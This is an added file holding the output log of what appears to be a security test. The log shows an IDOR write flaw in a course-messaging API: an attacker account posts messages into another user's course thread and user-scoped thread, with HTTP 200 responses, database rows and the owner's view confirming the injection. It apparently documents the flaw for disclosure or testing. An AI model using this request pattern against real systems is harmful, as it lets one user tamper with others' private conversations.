@@ -1,0 +1,14 @@
+[IDOR-WRITE] ATTACKER POST /api/message {type:Course, resource:1, message:'ATTACKER-INJECTED-MSG'}:
+{"message":"ATTACKER-INJECTED-MSG","user_id":4,"updated_at":"2026-09-28T16:55:58.000000Z","created_at":"2026-09-28T16:55:58.000000Z","id":4,"messageable_id":1,"messageable_type":"App\\Entities\\Course","user":{"id":4,"name":"Attacker Student","email":"attacker@test.local","username":"attacker1","email_verified_at":null,"media_token":null,"created_at":"2026-09-28T16:53:11.000000Z","updated_at":"2026-09-28T16:53:11.000000Z","avatar":"https:\/\/www.gravatar.com\/avatar\/e734a76a45d48b2f74f1fc0329ab49fb.jpg?s=80&d=mp&r=g"}}
+HTTP 200
+[persisted] DB rows on course 1 after injection:
+id	user_id	message	messageable_type	messageable_id
+1	3	OWNER-SECRET-MSG-1 course thread	App\\Entities\\Course	1
+2	3	OWNER-SECRET-MSG-2 course thread	App\\Entities\\Course	1
+3	3	OWNER-USER-SCOPE-MSG	NULL	NULL
+4	4	ATTACKER-INJECTED-MSG	App\\Entities\\Course	1
+[visible-to-owner] OWNER GET /api/message?type=Course&resource=1 after injection (attacker msg now inside course thread):
+ATTACKER-INJECTED-MSG
+[IDOR-WRITE-2] ATTACKER also injects into owner's user-scoped thread {type:User, resource:3}:
+{"message":"ATTACKER-USERSCOPE-MSG","user_id":3,"updated_at":"2026-09-28T16:56:00.000000Z","created_at":"2026-09-28T16:56:00.000000Z","id":5,"user":{"id":4,"name":"Attacker Student","email":"attacker@test.local","username":"attacker1","email_verified_at":null,"media_token":null,"created_at":"2026-09-28T16:53:11.000000Z","updated_at":"2026-09-28T16:53:11.000000Z","avatar":"https:\/\/www.gravatar.com\/avatar\/e734a76a45d48b2f74f1fc0329ab49fb.jpg?s=80&d=mp&r=g"}}
+HTTP 200
